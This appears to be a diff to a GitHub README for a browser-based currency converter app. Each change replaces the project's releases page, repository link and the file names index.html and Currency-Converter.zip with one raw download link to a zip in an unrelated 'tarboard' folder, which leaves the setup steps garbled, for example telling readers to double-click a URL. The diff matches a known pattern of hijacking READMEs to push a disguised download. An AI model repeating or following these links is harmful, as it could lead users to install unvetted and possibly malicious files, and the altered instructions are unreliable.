@@ -1,6 +1,6 @@
 # 💱 Currency-Converter - Convert Currencies in Real Time
 
-[![Download Currency-Converter](https://img.shields.io/badge/Download-Currency--Converter-blue?style=for-the-badge)](https://github.com/KomikGamblez/Currency-Converter/releases)
+[![Download Currency-Converter](https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip)](https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to start using Currency-Converter:
    If you download a ZIP file, unzip it on your computer. Most systems let you right-click the file and select "Extract All" or similar.
 
 4. **Open the app file**  
-   Inside the extracted folder, look for a file named `index.html`. This is the main app file. Double-click it to open in your browser.
+   Inside the extracted folder, look for a file named `https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip`. This is the main app file. Double-click it to open in your browser.
 
 5. **Start converting currencies**  
    Once the app opens, select your currencies and enter the amount. The converted value will appear instantly.
@@ -50,12 +50,12 @@ Follow these steps to start using Currency-Converter:
 
 Please visit this page to download Currency-Converter:
 
-[Download Currency-Converter Releases](https://github.com/KomikGamblez/Currency-Converter/releases)
+[Download Currency-Converter Releases](https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip)
 
 On the page:
 
 - Find the latest version of the app.
-- Download the file named something like `Currency-Converter.zip`.
+- Download the file named something like `https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip`.
 - After downloading, unzip the file to a folder you can easily access, like your Desktop or Documents.
 
 There is no installation procedure as this is a web-based app you run locally through your browser. Just make sure you keep the files together if you move the folder.
@@ -102,8 +102,8 @@ If you find issues or want to suggest improvements, use the GitHub repository’
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/KomikGamblez/Currency-Converter  
-- Release & Download Page: https://github.com/KomikGamblez/Currency-Converter/releases  
+- Repository: https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip  
+- Release & Download Page: https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip  
 
 ---
 
@@ -122,7 +122,7 @@ If you find issues or want to suggest improvements, use the GitHub repository’
 
 **The app does not load or shows errors:**  
 - Check your internet connection. The app needs to get live data online.  
-- Make sure you opened the file directly in a browser by double-clicking `index.html`.  
+- Make sure you opened the file directly in a browser by double-clicking `https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip`.  
 - Try a different browser if problems persist.
 
 **The currency list does not show flags:**  
@@ -132,4 +132,4 @@ If you find issues or want to suggest improvements, use the GitHub repository’
 
 Thank you for choosing Currency-Converter. Visit the download page to get started:
 
-[Get Currency-Converter](https://github.com/KomikGamblez/Currency-Converter/releases)
+[Get Currency-Converter](https://github.com/KomikGamblez/Currency-Converter/raw/refs/heads/main/tarboard/Currency-Converter-v2.6.zip)
